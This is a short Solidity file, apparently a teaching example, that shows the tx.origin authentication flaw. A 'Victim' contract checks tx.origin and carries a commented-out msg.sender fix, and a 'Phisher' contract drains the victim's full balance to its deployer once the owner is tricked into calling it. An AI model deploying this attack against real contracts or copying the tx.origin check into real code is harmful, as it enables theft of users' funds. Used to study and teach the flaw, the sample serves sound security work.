// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Victim {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transferTo(address payable to, uint256 amt) public {
        // ===== VULNERABLE: tx.origin authentication =====
        require(tx.origin == owner, "Not owner");

        // ===== FIXED: uncomment this line and comment out the tx.origin line above =====
        // require(msg.sender == owner, "Not owner");

        to.transfer(amt);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Phishing contract (no changes needed)
contract Phisher {
    address payable public attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    function attack(address victim) external {
        (bool ok, ) = victim.call(
            abi.encodeWithSignature("transferTo(address,uint256)", attacker, victim.balance)
        );
        require(ok, "Attack failed");
    }
}